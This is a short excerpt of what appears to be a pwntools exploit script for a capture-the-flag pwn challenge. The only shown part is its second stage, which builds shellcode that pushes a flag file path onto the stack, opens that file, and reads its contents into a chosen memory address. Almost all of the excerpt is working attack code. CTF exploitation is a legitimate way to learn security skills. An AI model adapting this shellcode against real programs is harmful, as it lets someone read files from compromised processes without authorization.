...
p = process()#remote("localhost", 1337)#
...
# stage 2 - shellcode
FLAG_PATH = "/home/alex/coding/mvmctf/pwn/flag.txt"#"/home/ctf/flag.txt"#
FLAG_MEMORY = 0x280010 # place somewhere where we have no chance to trigger sending 0x0a (\n)

sc = shellcraft.pushstr(FLAG_PATH)
sc += shellcraft.openat(0, "rsp", 0)
sc += shellcraft.read("rax", FLAG_MEMORY, 46)

sc += shellcraft.push(46)
